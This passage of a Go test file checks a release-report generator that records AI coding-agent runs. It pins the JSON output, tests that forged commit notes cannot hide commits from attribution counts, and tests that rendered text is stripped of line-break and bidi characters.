		Strategy: "overlay", AgentCmd: "claude -p", Source: "watch", Intent: "billing-rates",
		Tasks: []taskSpec{{ID: "t1"}, {ID: "t2"}},
		PerAgent: []perAgentJSON{
			{ID: "t1", Branch: "agent/t1", SHA: shas[3], OK: true},
			{ID: "t2", Branch: "agent/t2", SHA: hexSHA("c2"), OK: true},
		},
		Integrate: integrateJSON{
			Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2],
			DroppedByBisect: []string{"agent/t2"}, Flagged: []flaggedJSON{{Branch: "agent/t3"}},
		},
		Verify: verifyJSON{Ran: true, OK: true, Repaired: true, Bisect: &bisectJSON{Ran: true, Attempts: 3}},
		Policy: &policyJSON{Hash: "9f2c" + strings.Repeat("0", 60), Verify: []string{"go test ./..."}},
	})
	dir := filepath.Join(runsDir, id)
	releaseGoal(t, dir, "raise the billing rates")
	writeReleasePark(t, dir, releaseDay(2))
	// A second run that survives only as a note, so the quarantined shape is
	// pinned too.
	noteRep := runReport{
		RunID: releaseRunID(releaseDay(1), "bbbb"), BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339),
		Strategy: "overlay", AgentCmd: "aider",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/n1"}, FinalSHA: shas[1]},
		Verify:    verifyJSON{Ran: true, OK: true},
		Policy:    &policyJSON{Hash: "3ab1" + strings.Repeat("0", 60), Verify: []string{"make check"}},
	}
	data, err := json.MarshalIndent(noteRep, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := g.NoteAdd(ctx, "sigbound", shas[1], data); err != nil {
		t.Fatal(err)
	}

	_, raw := releaseJSON(t, repo, shas[0]+".."+shas[3])
	for i, sha := range shas { // full shas first; what is left of one is its short form
		raw = strings.ReplaceAll(raw, sha, fmt.Sprintf("<sha%d>", i))
	}
	for i, sha := range shas {
		raw = strings.ReplaceAll(raw, short(sha), fmt.Sprintf("<short%d>", i))
	}
	const want = `{
  "from": "<sha0>",
  "fromSHA": "<sha0>",
  "to": "<sha3>",
  "toSHA": "<sha3>",
  "commits": 3,
  "window": {
    "start": "2026-03-01T12:00:00Z",
    "end": "2026-03-04T12:00:00Z"
  },
  "landings": [
    {
      "runId": "20260303T120000Z-aaaa",
      "startedAt": "2026-03-03T12:00:00Z",
      "source": "watch",
      "intent": "billing-rates",
      "goal": "raise the billing rates",
      "tasks": [
        "t1",
        "t2"
      ],
      "landedSHA": "<short2>",
      "members": 1,
      "strategy": "overlay",
      "verify": "pass",
      "verifyDetail": {
        "repaired": true
      },
      "acceptance": [
        "go test ./..."
      ],
      "agent": "claude",
      "policyHash": "9f2c000000000000000000000000000000000000000000000000000000000000",
      "provenanceSource": "manifest"
    },
    {
      "runId": "20260302T120000Z-bbbb",
      "startedAt": "2026-03-02T12:00:00Z",
      "landedSHA": "<short1>",
      "members": 1,
      "strategy": "overlay",
      "verify": "pass",
      "agent": "aider",
      "provenanceSource": "note"
    }
  ],
  "parked": [
    {
      "runId": "20260303T120000Z-aaaa",
      "status": "awaiting-ack",
      "reason": "ack-paths",
      "branches": [
        "agent/t7"
      ],
      "matchedPaths": {
        "billing/rates.go": "billing/**"
      },
      "attempts": 1,
      "expiresAt": "2026-03-03T13:00:00Z"
    }
  ],
  "dropped": [
    {
      "runId": "20260303T120000Z-aaaa",
      "branches": [
        "agent/t2"
      ],
      "attempts": 3
    }
  ],
  "flagged": [
    {
      "runId": "20260303T120000Z-aaaa",
      "branches": [
        "agent/t3"
      ]
    }
  ],
  "agents": [
    {
      "agent": "aider",
      "runs": 1,
      "landed": 1,
      "unverified": true
    },
    {
      "agent": "claude",
      "runs": 1,
      "landed": 1
    }
  ],
  "policy": {
    "changed": false,
    "hashes": [
      {
        "hash": "9f2c000000000000000000000000000000000000000000000000000000000000",
        "firstRunId": "20260303T120000Z-aaaa"
      }
    ]
  },
  "unattributed": 0,
  "incomplete": 0,
  "withCommands": false
}
`
	if raw != want {
		t.Fatalf("release -json shape drifted.\n--- got ---\n%s\n--- want ---\n%s", raw, want)
	}
}

// TestReleaseColludingNoteCannotVanishACommit: a landing's identity is public —
// run ids are printed in every release document and in `sig log`, and the landed
// sha is right there in the range — so a note can BORROW one. Such a note
// collides with a landing that is already rendered and does NOT land its commit;
// the commit must then stay exactly where it was, counted `unattributed`. It
// used to be deleted from the unclaimed set while rendering no row of its own,
// so it vanished from both lists and the document silently claimed a
// completeness it did not have.
func TestReleaseColludingNoteCannotVanishACommit(t *testing.T) {
	for _, tc := range []struct {
		name   string
		borrow func(runID, landedSHA string, rep *runReport)
	}{
		{"borrowed run id", func(runID, _ string, rep *runReport) {
			rep.RunID = runID
			rep.Integrate.FinalSHA = hexSHA("dead") // some landing of its own, out of range
		}},
		{"borrowed landed sha", func(_, landedSHA string, rep *runReport) {
			rep.RunID = "" // no id: the landed sha is the fallback identity
			rep.Integrate.FinalSHA = landedSHA
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			g, repo, shas := releaseRepo(t)
			runsDir := logRunsDir(t, g)
			ctx := context.Background()
			id := releaseRunID(releaseDay(1), "aaaa")
			writeLogRun(t, runsDir, id, runReport{
				RunID: id, BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude -p",
				Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[1]},
				Verify:    verifyJSON{Ran: true, OK: true},
			})
			before, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])

			// A note on a hand-written range commit, claiming it as a landed member
			// of a landing this repo's ledger already rendered without it.
			forged := runReport{
				BaseSHA: hexSHA("00"), StartedAt: releaseDay(2).Format(time.RFC3339),
				Strategy: "overlay", AgentCmd: "claude -p",
				PerAgent:  []perAgentJSON{{ID: "x", Branch: "agent/x", SHA: shas[2], OK: true}},
				Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/x"}},
				Verify:    verifyJSON{Ran: true, OK: true},
			}
			tc.borrow(id, shas[1], &forged)
			data, err := json.MarshalIndent(forged, "", "  ")
			if err != nil {
				t.Fatal(err)
			}
			if err := g.NoteAdd(ctx, "sigbound", shas[2], data); err != nil {
				t.Fatal(err)
			}

			after, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
			// Every range commit is in exactly one place: claimed by a landing, or
			// counted unattributed. A note that renders NO landing row therefore
			// cannot lower the unattributed count.
			if len(after.Landings) == len(before.Landings) && after.Unattributed != before.Unattributed {
				t.Fatalf("a commit vanished from both lists: landings %d -> %d, unattributed %d -> %d",
					len(before.Landings), len(after.Landings), before.Unattributed, after.Unattributed)
			}
			if len(after.Landings) != 1 || after.Unattributed != 2 {
				t.Fatalf("landings = %+v, unattributed = %d, want the one ledger landing and 2 unattributed",
					after.Landings, after.Unattributed)
			}
		})
	}
}

// TestReleaseSameAgentNameIsNotMerged: the ledger and a commit note naming the
// SAME program is the likeliest real shape — one bucket per (program, source) is
// the only thing keeping a note's claimed runs out of the ledger's row.
func TestReleaseSameAgentNameIsNotMerged(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	ctx := context.Background()
	id := releaseRunID(releaseDay(1), "aaaa")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[1]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})
	noteRep := runReport{
		RunID: releaseRunID(releaseDay(2), "bbbb"), BaseSHA: hexSHA("00"),
		StartedAt: releaseDay(2).Format(time.RFC3339), Strategy: "overlay", AgentCmd: "/usr/local/bin/claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/n1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	}
	data, err := json.MarshalIndent(noteRep, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := g.NoteAdd(ctx, "sigbound", shas[2], data); err != nil {
		t.Fatal(err)
	}

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	want := []releaseAgent{
		{Agent: "claude", Runs: 1, Landed: 1},
		{Agent: "claude", Runs: 1, Landed: 1, Unverified: true},
	}
	if !reflect.DeepEqual(doc.Agents, want) {
		t.Fatalf("agents = %+v, want the ledger row and the note row kept apart: %+v", doc.Agents, want)
	}
	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
	if !strings.Contains(md, "| claude | 1 | 1 |") || !strings.Contains(md, "unverified") {
		t.Fatalf("attribution table merged or mislabelled the rows:\n%s", md)
	}
}

// TestReleaseTextKeepsTextOnItsLine is releaseText's own contract: nothing a run
// recorded can end the line it is rendered on, in ANY renderer's idea of a line
// break, and nothing can add a table cell. Emphasis is left alone on purpose.
func TestReleaseTextKeepsTextOnItsLine(t *testing.T) {
	cases := map[string]string{
		"a\nb":            "a b",
		"a\r\n\n\tb":      "a b",
		"a\u2028b":        "a b", // LINE SEPARATOR
		"a\u2029b":        "a b", // PARAGRAPH SEPARATOR
		"a\ufeffb":        "a b", // ZERO WIDTH NO-BREAK SPACE / BOM
		"a\u202eb":        "a b", // RIGHT-TO-LEFT OVERRIDE
		"cl|aude":         `cl\|aude`,
		"  ship it  ":     "ship it",
		"*bold* `code`":   "*bold* `code`",
		"### not a break": "### not a break",
	}
	for in, want := range cases {
		got := releaseText(in)
		if got != want {
			t.Fatalf("releaseText(%q) = %q, want %q", in, got, want)
		}
		if strings.ContainsAny(got, "\n\r\u2028\u2029") {
			t.Fatalf("releaseText(%q) still carries a line break", in)
		}
	}
}
